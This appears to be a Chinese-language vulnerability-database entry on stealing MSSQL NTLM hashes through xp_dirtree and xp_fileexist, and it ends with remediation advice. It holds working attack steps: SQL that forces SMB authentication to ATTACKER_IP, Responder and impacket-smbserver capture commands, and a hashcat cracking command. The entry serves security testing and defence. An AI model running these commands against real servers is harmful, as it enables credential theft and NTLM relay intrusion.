---
id: MSSQL-NTLM-RELAY
title: "MSSQL - NTLM Hash 窃取（xp_dirtree）"
product: mssql
vendor: Microsoft
version_affected: "all versions (misconfiguration)"
severity: HIGH
tags: [ntlm, hash窃取, relay, 需要认证]
fingerprint: ["Microsoft SQL Server"]
---

## 漏洞描述

MSSQL 的 xp_dirtree 和 xp_fileexist 等扩展存储过程可以访问 UNC 路径（`\\server\share`），这会触发 Windows SMB 认证流程，将当前 MSSQL 服务账户的 NTLM Hash 发送给攻击者控制的 SMB 服务器。攻击者可以捕获此 Hash 进行离线破解或 NTLM Relay 攻击。

## 影响版本

- 所有 Windows 版本的 MSSQL

## 前置条件

- 已获取任意数据库登录权限（不一定需要 sysadmin）
- MSSQL 服务器能够向攻击者发起 SMB 连接（出站 445 端口未被防火墙封禁）
- 攻击者有可接收 SMB 认证的服务器

## 利用步骤

```sql
-- 攻击者先在自己的机器上启动 SMB 监听
-- 方式 1: Responder
-- sudo responder -I eth0

-- 方式 2: impacket-smbserver
-- impacket-smbserver share /tmp -smb2support

-- 然后在 MSSQL 中执行，强制向攻击者发起 SMB 认证
EXEC xp_dirtree '\\ATTACKER_IP\share';
-- 或
EXEC xp_fileexist '\\ATTACKER_IP\share\file';
```

## Payload

```bash
# 攻击者端 - 启动 Responder 捕获 NTLM Hash
sudo responder -I eth0

# 攻击者端 - 使用 impacket-smbserver
impacket-smbserver share /tmp -smb2support

# 捕获到的 NTLMv2 Hash 可以使用 hashcat 破解
hashcat -m 5600 hash.txt wordlist.txt
```

## 修复建议

1. 限制 MSSQL 服务器的出站 SMB 连接（防火墙封禁出站 445 端口）
2. 使用最小权限的服务账户运行 MSSQL
3. 禁用不必要的扩展存储过程（xp_dirtree、xp_fileexist）
4. 启用 SMB Signing 防止 NTLM Relay
5. 对服务账户使用强密码
